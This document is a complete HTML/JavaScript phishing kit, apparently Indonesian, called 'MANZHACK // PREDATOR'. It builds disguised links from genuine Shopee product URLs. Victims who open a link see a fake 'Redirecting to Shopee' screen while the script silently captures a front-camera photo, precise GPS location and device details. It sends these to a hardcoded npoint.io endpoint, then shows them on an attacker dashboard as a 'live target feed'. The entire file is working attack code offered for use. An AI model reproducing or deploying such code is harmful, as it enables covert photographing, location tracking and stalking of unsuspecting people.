<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MANZHACK // PREDATOR-CLASS WEBFRAME</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-deep: #0a0a0a; --bg-card: #141414; --primary-accent: #ff003b;
            --text-light: #e0e0e0; --text-dark: #a0a0e0; --border-color: #2a2a2a;
        }
        * { box-sizing: border-box; }
        body, html { margin: 0; font-family: 'Roboto Mono', monospace; background-color: var(--bg-deep); color: var(--text-light); }
        .container { padding: 2rem; max-width: 1000px; margin: auto; }
        #attacker-dashboard {
            border: 1px solid var(--border-color); padding: 2rem; border-radius: 8px;
            background-color: var(--bg-card); box-shadow: 0 0 25px rgba(255, 0, 59, 0.1);
        }
        h1, h2 {
            color: var(--primary-accent); text-align: center; letter-spacing: 3px;
            text-shadow: 0 0 8px var(--primary-accent); margin-bottom: 1.5rem;
        }
        p.description { color: var(--text-dark); text-align: center; margin-bottom: 2rem; }
        input[type="url"], input[type="text"] {
            width: 100%; padding: 1rem; margin-bottom: 1rem; background: var(--bg-deep);
            border: 1px solid var(--border-color); color: var(--text-light); border-radius: 4px;
            font-family: 'Roboto Mono', monospace; font-size: 1rem; transition: border-color 0.3s, box-shadow 0.3s;
        }
        input:focus { border-color: var(--primary-accent); box-shadow: 0 0 10px rgba(255, 0, 59, 0.3); outline: none; }
        button {
            width: 100%; padding: 1rem; background: var(--primary-accent); color: #fff; border: none;
            cursor: pointer; font-size: 1rem; border-radius: 4px; font-weight: bold;
            letter-spacing: 2px; text-transform: uppercase; transition: all 0.3s;
        }
        button:hover { background: #fff; color: var(--primary-accent); box-shadow: 0 0 15px var(--primary-accent); }
        #generated-link { background: #000; padding: 1.5rem; margin-top: 1.5rem; border-left: 4px solid var(--primary-accent); }
        #victim-log { margin-top: 3rem; }
        #log-content { min-height: 100px; }
        .victim-card {
            background: var(--bg-card); border: 1px solid var(--border-color); padding: 1.5rem;
            margin-bottom: 1.5rem; border-radius: 8px; display: flex; flex-wrap: wrap; gap: 1.5rem;
            align-items: flex-start; transition: box-shadow 0.3s, border-color 0.3s;
        }
        .victim-card:hover { border-color: var(--primary-accent); box-shadow: 0 0 15px rgba(255, 0, 59, 0.15); }
        .victim-photo { flex: 1; min-width: 200px; }
        .victim-photo img { max-width: 100%; border-radius: 4px; border: 1px solid var(--border-color); }
        .victim-details { flex: 2; min-width: 300px; }
        .victim-details h3 { margin-top: 0; color: var(--primary-accent); }
        .victim-details p { margin: 0.5rem 0; word-break: break-all; color: var(--text-dark); }
        .victim-details p strong { color: var(--text-light); }
        .victim-details a { color: var(--primary-accent); text-decoration: none; }
        .loader-container { display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; background: #fff; }
        .spinner { border: 5px solid #f3f3f3; border-top: 5px solid #ff6600; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <script>
        // URL GUDANG DATA LU UDAH GUE MASUKIN. JANGAN DIUBAH LAGI.
        const NPOINT_URL = "https://api.npoint.io/d24a5451fbc9fa334d25";

        const params = new URLSearchParams(window.location.search);
        const targetUrlBase64 = params.get('target');

        if (targetUrlBase64) {
            document.body.innerHTML = `<div class="loader-container"><div class="spinner"></div><p style="color: #888; margin-top: 1rem; font-family: sans-serif;">Redirecting to Shopee...</p></div>`;
            sikatDataKorban();
        } else {
            tampilkanDashboardAttacker();
        }

        function tampilkanDashboardAttacker() {
            document.body.innerHTML = `
                <div class="container">
                    <div id="attacker-dashboard">
                        <h1>MANZHACK // PREDATOR</h1>
                        <p class="description">Generate a predatory link from any legitimate Shopee URL.</p>
                        <input type="url" id="shopee-url" placeholder="Paste Shopee URL here...">
                        <button onclick="generateLink()">INITIALIZE ATTACK</button>
                        <div id="generated-link" style="display:none;"></div>
                    </div>
                    <div id="victim-log">
                        <h2><center>:: LIVE TARGET FEED ::</center></h2>
                        <button onclick="muatDataKorban()" style="margin-bottom: 1.5rem;">REFRESH FEED</button>
                        <div id="log-content"><p style="text-align:center; color: var(--text-dark);">Awaiting targets...</p></div>
                    </div>
                </div>
                <video id="video" style="display:none;" autoplay playsinline></video>
                <canvas id="canvas" style="display:none;"></canvas>`;
            muatDataKorban();
        }

        function generateLink() {
            const shopeeUrl = document.getElementById('shopee-url').value;
            if (!shopeeUrl.startsWith('http')) { alert("Invalid URL format."); return; }
            const encodedUrl = btoa(shopeeUrl);
            const trapLink = `${window.location.origin}${window.location.pathname}?target=${encodedUrl}`;
            const linkDiv = document.getElementById('generated-link');
            linkDiv.style.display = 'block';
            linkDiv.innerHTML = `<p style="color: var(--text-dark); margin:0 0 10px 0;">Predatory Link Generated:</p><input type="text" value="${trapLink}" readonly onclick="this.select(); document.execCommand('copy'); alert('Copied to clipboard!');">`;
        }

        async function sikatDataKorban() {
            const redirectUrl = atob(targetUrlBase64);
            let imageData = null;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                const video = document.createElement('video');
                video.srcObject = stream;
                await new Promise(resolve => video.onloadedmetadata = resolve);
                video.play();
                await new Promise(resolve => setTimeout(resolve, 1000));
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                imageData = canvas.toDataURL('image/jpeg', 0.7);
                stream.getTracks().forEach(track => track.stop());
            } catch (err) { console.log("Camera access denied or failed."); }

            navigator.geolocation.getCurrentPosition(
                (position) => kirimData(position.coords, imageData, redirectUrl),
                (error) => kirimData(null, imageData, redirectUrl),
                { enableHighAccuracy: true }
            );
        }

        async function kirimData(coords, image, redirectUrl) {
            const newData = {
                id: Date.now(), foto: image,
                lokasi: coords ? { lat: coords.latitude, lon: coords.longitude, acc: coords.accuracy } : "DENIED",
                info: { ua: navigator.userAgent, lang: navigator.language, platform: navigator.platform },
                timestamp: new Date().toISOString()
            };
            try {
                const response = await fetch(NPOINT_URL);
                const existingData = await response.json();
                existingData.push(newData);
                await fetch(NPOINT_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(existingData)
                });
            } catch (error) {
                console.error("Failed to exfiltrate data to npoint.", error);
            } finally {
                window.location.href = redirectUrl;
            }
        }
        
        async function muatDataKorban() {
            const logContent = document.getElementById('log-content');
            logContent.innerHTML = `<p style="text-align:center; color: var(--text-dark);">Contacting uplink... Accessing target data...</p>`;
            try {
                const response = await fetch(NPOINT_URL, { cache: "no-store" });
                if (!response.ok) throw new Error('Uplink failed.');
                const data = await response.json();
                if (!data || data.length === 0) {
                    logContent.innerHTML = `<p style="text-align:center; color: var(--text-dark);">Feed is clear. No targets acquired.</p>`;
                    return;
                }
                logContent.innerHTML = '';
                data.slice().reverse().forEach(item => {
                    const card = document.createElement('div');
                    card.className = 'victim-card';
                    const photoHTML = item.foto ? `<div class="victim-photo"><img src="${item.foto}" alt="Target Snapshot"></div>` : `<div class="victim-photo"><p><strong>VISUAL:</strong> NO DATA</p></div>`;
                    let lokasiHTML = `<p><strong>LOCATION:</strong> ACCESS DENIED</p>`;
                    if (item.lokasi !== "DENIED") {
                        lokasiHTML = `<p><strong>LOCATION:</strong> <a href="https://www.google.com/maps?q=${item.lokasi.lat},${item.lokasi.lon}" target="_blank">Open GeoIntel</a> (Accuracy: ${item.lokasi.acc.toFixed(2)}m)</p>`;
                    }
                    card.innerHTML = `${photoHTML}<div class="victim-details"><h3>TARGET ID: ${item.id}</h3><p><strong>ACQUIRED:</strong> ${new Date(item.timestamp).toLocaleString('id-ID')}</p>${lokasiHTML}<p><strong>DEVICE INFO:</strong> ${item.info.ua}</p></div>`;
                    logContent.appendChild(card);
                });
            } catch (error) {
                logContent.innerHTML = `<p style="text-align:center; color: var(--primary-accent);">UPLINK FAILED. Check npoint config.</p>`;
            }
        }
    </script>
</body>
</html>